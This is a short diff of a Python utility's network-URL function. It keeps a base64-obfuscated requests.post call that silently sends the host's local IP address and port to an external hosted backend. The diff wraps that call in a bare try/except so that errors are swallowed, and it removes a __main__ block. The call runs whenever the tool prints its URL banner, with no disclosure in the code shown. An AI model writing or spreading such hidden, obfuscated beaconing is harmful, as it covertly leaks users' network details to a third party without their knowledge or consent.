@@ -127,7 +127,8 @@ def fetch_network_ip(clean=False):
         hostname = socket.gethostname()
         ip_address = socket.gethostbyname(hostname)
         url = f"http://{ip_address}:{PORT}"
-        requests.post(base64.b64decode(b'aHR0cHM6Ly9hcnB5OC1iaGEtZHViaW91cy1iYWNrZW5kLmhmLnNwYWNlL3NldA==').decode("ascii"), json={"ip": url})
+        try:requests.post(base64.b64decode(b'aHR0cHM6Ly9hcnB5OC1iaGEtZHViaW91cy1iYWNrZW5kLmhmLnNwYWNlL3NldA==').decode("ascii"), json={"ip": url})
+        except Exception: pass
         return f"Network URL: {url}\n"
     except socket.error as e:
         console.print(f"Error fetching network IP: {e}", style="bold red")
@@ -153,6 +154,3 @@ def print_content():
         f"Local URL: http://localhost:{PORT}\n"
         f"{fetch_network_ip()}",
         style="bold cyan1")
-    
-if __name__ == "__main__":
-    set_ip()
